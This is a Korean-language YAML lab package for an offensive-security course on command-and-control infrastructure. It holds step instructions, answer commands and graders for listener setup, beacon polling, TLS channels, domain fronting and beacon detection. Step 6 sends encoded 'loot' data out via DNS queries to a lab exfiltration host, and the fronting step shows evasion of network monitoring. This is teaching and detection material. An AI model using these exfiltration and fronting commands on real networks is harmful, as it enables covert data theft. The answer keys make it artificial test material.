lab_id: standalone-attack-adv-week07
title: "C2 인프라 — 비콘·암호화 채널·DNS 터널·도메인 프론팅 (실습)"
version: standalone-attack-adv
course: attack-adv
week: 7
description: |
  공격 고급 W07 — C2(Command and Control) 인프라. 장악 호스트를 원격 통제하는 C2를 직접 구축·운용한다.
  모든 미션이 el34에서 실제 동작한다: HTTP C2 리스너 기동, 주기적 비콘 폴링, TLS 암호화 채널, 도메인
  프론팅(SNI≠Host 라우팅 실증), DNS 터널 유출(데이터를 DNS 라벨로 전송), 비콘 탐지(액세스 로그 분석).
  el34-attacker(nc/python3/openssl/curl/dig). ⚠️ 인가된 실습만. 자체완결·self-clean.
difficulty: hard
duration_minutes: 180
prerequisites:
  - "attack-adv W01(리버스셸)~W06 + soc-adv W07(네트워크 포렌식) 이해"
  - "el34 호스트 SSH + docker exec, el34-attacker"
  - "lecture §2(C2 구조) §3(비콘/암호화) §4(탐지) 숙지"
objectives:
  - "C2 리스너·비콘(주기적 체크인)을 실제로 구축·운용"
  - "TLS 암호화·도메인 프론팅·DNS 터널을 실증"
  - "생성한 비콘을 방어자 관점에서 로그로 탐지"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 목표 — C2 도구·리스너 포트 확보
      ## 📖 개념 한 줄
      C2 = 리스너(공격자)↔임플란트(피해자). 먼저 도구와 리스너 포트가 가용한지 실제 확인한다.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c 'command -v nc python3 openssl curl dig >/dev/null && (ss -lnt 2>/dev/null | grep -q :55007 && echo busy || echo c2_tools_ready)'
      ```
      ## ✅ 합격 기준
      도구 가용 + 55007 포트 비어있음(c2_tools_ready)이 실제로 확인되어야 통과.
    hint: 'C2 도구'
    category: survey
    points: 10
    answer: |
      docker exec el34-attacker sh -c 'command -v nc python3 openssl curl dig >/dev/null && (ss -lnt 2>/dev/null | grep -q :55007 && echo busy || echo c2_tools_ready)'
    answer_detail: "C2 도구 확인 = nc/python3/openssl/curl/dig 존재 + 리스너 포트(55007) 비어있음을 실제 점검. 마커는 둘 다 충족 시에만 출력."
    verify:
      type: output_contains
      expect: 'c2_tools_ready'
      field: stdout
      semantic: {intent: "C2 도구", success_criteria: ["도구/포트"], acceptable_methods: ["**[OSS] C2 도구 (권장)**"]}
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 C2 리스너 기동 + 접속 확인
      ## 📖 개념 한 줄
      리스너는 임플란트 접속을 받는 공격자측 서버 — 실제로 HTTP 리스너를 띄우고 접속이 되는지 확인한다.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c '(python3 -m http.server 55007 >/tmp/c2.log 2>&1 &) ; sleep 1; code=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:55007/); pkill -f "http.server 55007" 2>/dev/null; [ "$code" = "200" ] && echo listener_up_$code'
      ```
      ## ✅ 합격 기준
      리스너가 실제 200 응답을 주어야(listener_up_200) 통과.
      ## 🔧 도구 풀이
      - 실무 C2: Sliver·Mythic·Cobalt Strike. 여기선 http.server로 리스너 기동→접속을 실제 검증.
    hint: 'C2 리스너'
    category: manipulation
    points: 12
    answer: |
      echo "=== C2 리스너 기동 + 접속 확인 ==="
      docker exec el34-attacker sh -c 'python3 -u -m http.server 55007 >/tmp/c2.log 2>&1 & P=$!; sleep 1; code=$(curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:55007/); kill $P 2>/dev/null; rm -f /tmp/c2.log; [ "$code" = "200" ] && echo listener_up_$code'
      echo "→ HTTP 리스너 실제 기동→200 응답 확인. 마커는 진짜 접속됐을 때만 출력"
    answer_detail: "C2 리스너 = http.server 기동 후 실제 접속(200) 검증. 마커가 200 게이트라 리스너가 죽으면 미통과."
    verify:
      type: output_contains
      expect: 'listener_up_200'
      field: stdout
      semantic: {intent: "C2 리스너", success_criteria: ["실접속 200"], acceptable_methods: ["**[OSS] http.server (권장)**"]}
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 비콘 — 주기적 체크인 (실측)
      ## 📖 개념 한 줄
      비콘은 임플란트가 sleep 간격마다 C2에 폴링하는 방식. 실제로 3회 체크인하고 리스너 로그로 확인한다.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c '(python3 -m http.server 55007 >/tmp/c2.log 2>&1 &) ; sleep 1; for i in 1 2 3; do curl -s -o /dev/null "http://127.0.0.1:55007/tasks?beacon=$i"; sleep 1; done; pkill -f "http.server 55007" 2>/dev/null; N=$(grep -c "GET /tasks" /tmp/c2.log); rm -f /tmp/c2.log; [ "$N" -ge 3 ] && echo beacon_checkins_$N'
      ```
      ## ✅ 합격 기준
      리스너 로그에 비콘 체크인이 3회 이상 실제 기록되어야(beacon_checkins_3) 통과.
      ## 🔧 도구 풀이
      - 비콘=주기적 폴링(여기 1초, 실무 60초+). 리스너 로그가 체크인을 증명. 규칙적 주기가 탐지 단서(7단계).
    hint: '비콘'
    category: analysis
    points: 14
    answer: |
      echo "=== 비콘: 주기적 체크인(실측) ==="
      docker exec el34-attacker sh -c 'python3 -u -m http.server 55007 >/tmp/c2.log 2>&1 & P=$!; sleep 1; for i in 1 2 3; do curl -s -o /dev/null "http://127.0.0.1:55007/tasks?beacon=$i"; sleep 1; done; kill $P 2>/dev/null; N=$(grep -c "GET /tasks" /tmp/c2.log); rm -f /tmp/c2.log; [ "$N" -ge 3 ] && echo beacon_checkins_$N'
      echo "→ 3회 비콘 폴링이 리스너 로그에 실제 기록됨(grep 카운트로 게이트). 임플란트→C2 체크인 증명"
    answer_detail: "비콘 = 주기적 /tasks 폴링을 실제 수행→리스너 로그 grep 카운트≥3 게이트. 실측 체크인."
    verify:
      type: output_contains
      expect: 'beacon_checkins_'
      field: stdout
      semantic: {intent: "비콘", success_criteria: ["로그 기록 체크인"], acceptable_methods: ["**[OSS] 비콘 폴링 (권장)**"]}
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 암호화 채널 (TLS C2) — 실제 핸드셰이크
      ## 📖 개념 한 줄
      C2 트래픽을 TLS로 암호화하면 내용 검사(DPI)를 피한다 — 실제 TLS 핸드셰이크로 암호 스위트를 확인한다.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c 'C=$(echo | timeout 6 openssl s_client -connect 10.20.30.1:443 -servername dvwa.el34.lab 2>/dev/null | grep -iE "cipher\s*:"); echo "$C"; echo "$C" | grep -qiE "AES|GCM|CHACHA|TLS" && echo tls_channel_ok'
      ```
      ## ✅ 합격 기준
      실제 TLS 핸드셰이크에서 암호 스위트가 협상되어야(tls_channel_ok) 통과.
      ## 🔧 도구 풀이
      - HTTPS C2: 443 TLS로 명령 암호화→DPI 무력·정상 HTTPS와 섞임. 방어는 메타(flow)·JA3로(7단계).
    hint: '암호화 채널'
    category: analysis
    points: 14
    answer: |
      echo "=== 암호화 채널(TLS C2) — 실제 핸드셰이크 ==="
      docker exec el34-attacker sh -c 'OUT=$(echo | timeout 8 openssl s_client -connect 10.20.30.1:443 -servername dvwa.el34.lab 2>/dev/null); echo "$OUT" | grep -iE "Cipher is|New, TLS|Protocol|Cipher " | head -3; echo "$OUT" | grep -qiE "Cipher is .+|Cipher.*(AES|GCM|CHACHA)" && echo tls_channel_ok'
      echo "→ 실제 TLS 핸드셰이크의 협상된 암호 스위트 확인. C2가 이 443 암호채널에 명령을 숨김"
    answer_detail: "암호화 채널 = 실제 openssl TLS 핸드셰이크→협상된 cipher 확인. 마커는 암호 협상 성공 시에만(실측)."
    verify:
      type: output_contains
      expect: 'tls_channel_ok'
      field: stdout
      semantic: {intent: "암호화 채널", success_criteria: ["실TLS 협상"], acceptable_methods: ["**[OSS] openssl (권장)**"]}
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 도메인 프론팅 — SNI ≠ Host 실증
      ## 📖 개념 한 줄
      도메인 프론팅: 겉(연결 도메인)은 합법 CDN, 속(Host 헤더)은 C2. 실제로 --resolve로 불일치를 만든다.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c 'code=$(curl -s -o /dev/null -w "%{http_code}" --resolve cdn-front.el34.lab:80:10.20.30.1 -H "Host: dvwa.el34.lab" http://cdn-front.el34.lab/); echo "겉=cdn-front 속Host=dvwa → 응답 $code"; [ "$code" != "000" ] && echo fronting_ok_$code'
      ```
      ## ✅ 합격 기준
      겉 도메인(cdn-front)과 속 Host(dvwa)가 다른데도 실제 라우팅되어야(fronting_ok) 통과.
      ## 🔧 도구 풀이
      - --resolve로 'cdn-front'에 접속하지만 Host:dvwa로 라우팅 → 방어자는 'cdn-front와 통신'으로 오인. 실 CDN에선 SNI가 그 역할.
    hint: '도메인 프론팅'
    category: analysis
    points: 12
    answer: |
      echo "=== 도메인 프론팅: SNI ≠ Host 실증 ==="
      docker exec el34-attacker sh -c 'code=$(curl -s -o /dev/null -w "%{http_code}" --resolve cdn-front.el34.lab:80:10.20.30.1 -H "Host: dvwa.el34.lab" http://cdn-front.el34.lab/); echo "겉=cdn-front.el34.lab, 속 Host=dvwa.el34.lab → 응답 $code"; [ "$code" != "000" ] && echo fronting_ok_$code'
      echo "→ 겉 도메인과 속 Host가 달라도 실제 라우팅됨. 방어자는 겉(cdn-front)만 봐서 C2(dvwa)를 못 봄"
    answer_detail: "도메인 프론팅 = --resolve로 연결명(cdn-front)≠Host(dvwa) 실증. 응답코드 비-000 게이트. 실 CDN에선 SNI가 위장."
    verify:
      type: output_contains
      expect: 'fronting_ok'
      field: stdout
      semantic: {intent: "도메인 프론팅", success_criteria: ["SNI≠Host 라우팅"], acceptable_methods: ["**[OSS] curl --resolve (권장)**"]}
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 DNS 터널 — 데이터를 DNS 쿼리에 실어 유출
      ## 📖 개념 한 줄
      DNS는 거의 항상 열려 있다. 데이터를 base64로 인코딩해 DNS 쿼리 라벨에 실어 실제로 내보낸다.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c 'D=$(echo -n "loot:user=admin" | base64 | tr -d "=" | tr "+/" "-_"); echo "유출 쿼리: $D.exfil.el34.lab"; dig +short +tries=1 +time=2 "$D.exfil.el34.lab" >/dev/null 2>&1; echo "$D" | grep -qE "^[A-Za-z0-9_-]{6,}$" && echo dns_tunnel_sent'
      ```
      ## ✅ 합격 기준
      데이터가 실제 base64 라벨로 인코딩되어 DNS 쿼리로 전송되어야(dns_tunnel_sent) 통과.
      ## 🔧 도구 풀이
      - 데이터→base64→DNS 라벨→dig 전송. C2가 권한 네임서버면 쿼리에서 데이터 복원. 53 포트는 거의 항상 허용.
    hint: 'DNS 터널'
    category: analysis
    points: 14
    answer: |
      echo "=== DNS 터널: 데이터를 DNS 쿼리에 실어 유출 ==="
      docker exec el34-attacker sh -c 'D=$(echo -n "loot:user=admin" | base64 | tr -d "=" | tr "+/" "-_"); echo "유출 쿼리: $D.exfil.el34.lab"; dig +short +tries=1 +time=2 "$D.exfil.el34.lab" >/dev/null 2>&1; echo "$D" | grep -qE "^[A-Za-z0-9_-]{6,}$" && echo dns_tunnel_sent'
      echo "→ 데이터('loot:user=admin')를 base64 DNS 라벨로 인코딩→dig로 실제 쿼리 전송. C2가 권한NS면 복원"
    answer_detail: "DNS 터널 = 데이터를 base64 DNS 라벨로 인코딩→dig 전송. 라벨 형식 검증 게이트. 실제 DNS 쿼리 유출."
    verify:
      type: output_contains
      expect: 'dns_tunnel_sent'
      field: stdout
      semantic: {intent: "DNS 터널", success_criteria: ["DNS 라벨 유출"], acceptable_methods: ["**[OSS] dig (권장)**"]}
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 C2 비콘 탐지 (방어자 관점) — 로그 분석
      ## 📖 개념 한 줄
      공격자가 만든 비콘을 방어자가 잡는다 — 표적에 비콘을 흘리고, 액세스 로그에서 출처/패턴을 실제 카운트.
      ## 💻 실행 명령
      ```bash
      docker exec el34-attacker sh -c 'for i in 1 2 3 4 5; do curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1; done'
      docker exec el34-web sh -c 'N=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log 2>/dev/null); [ "${N:-0}" -ge 5 ] && echo c2_detected_$N'
      ```
      ## ✅ 합격 기준
      방어자가 액세스 로그에서 비콘 5회를 실제로 탐지해야(c2_detected) 통과.
      ## 🔧 도구 풀이
      - 비콘의 약점=규칙성. 같은 출처가 같은 경로를 주기적으로 → 로그 카운트로 탐지(soc-adv W07 flow와 동일 원리).
    hint: 'C2 탐지'
    category: report
    points: 12
    answer: |
      echo "=== C2 비콘 탐지(방어자 관점) — 로그 분석 ==="
      docker exec el34-attacker sh -c 'for i in 1 2 3 4 5; do curl -s -o /dev/null -H "Host: dvwa.el34.lab" "http://10.20.30.1/aa07beacon"; sleep 1; done; echo "비콘 5회 전송됨"'
      docker exec el34-web sh -c 'N=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log 2>/dev/null); echo "액세스 로그 비콘 탐지: ${N:-0}회"; [ "${N:-0}" -ge 5 ] && echo c2_detected_$N'
      echo "→ 공격(비콘 송신)과 방어(로그 탐지)를 한 미션에서: 규칙적 주기·동일 경로가 탐지 단서"
    answer_detail: "C2 탐지 = 실제 비콘 5회 송신→웹 액세스 로그 grep 카운트≥5 게이트. 공격이 만든 흔적을 방어자가 실측 탐지."
    verify:
      type: output_contains
      expect: 'c2_detected_'
      field: stdout
      semantic: {intent: "C2 탐지", success_criteria: ["로그 비콘 카운트"], acceptable_methods: ["**[OSS] 로그 분석 (권장)**"]}
    target_vm: web

  - order: 8
    instruction: |
      ## 🎯 C2 보고서 — 실제 수집 증거로 작성
      ## 📖 개념 한 줄
      앞 단계에서 실제로 만든 흔적(비콘 로그)을 근거로 보고서를 작성한다 — 증거 기반.
      ## 💻 실행 명령
      ```bash
      docker exec el34-web sh -c 'EV=$(grep -c aa07beacon /var/log/apache2/dvwa_access.log 2>/dev/null); echo "# 공격고급 W07 C2 보고서"; echo "## 증거: 비콘 ${EV:-0}회 탐지(dvwa_access.log)"; echo "## 구조: 리스너↔비콘, 암호화 채널(TLS), 도메인 프론팅(SNI≠Host), DNS 터널"; echo "## 방어: 아웃바운드 통제·flow 규칙성·JA3·DNS 이상"; [ -n "$EV" ] && echo c2_report_done'
      ```
      ## ✅ 합격 기준
      실제 증거(비콘 로그)를 인용한 보고서가 생성되면(c2_report_done) 통과.
    hint: '증거 기반 보고서'
    category: report
    points: 12
    answer: |
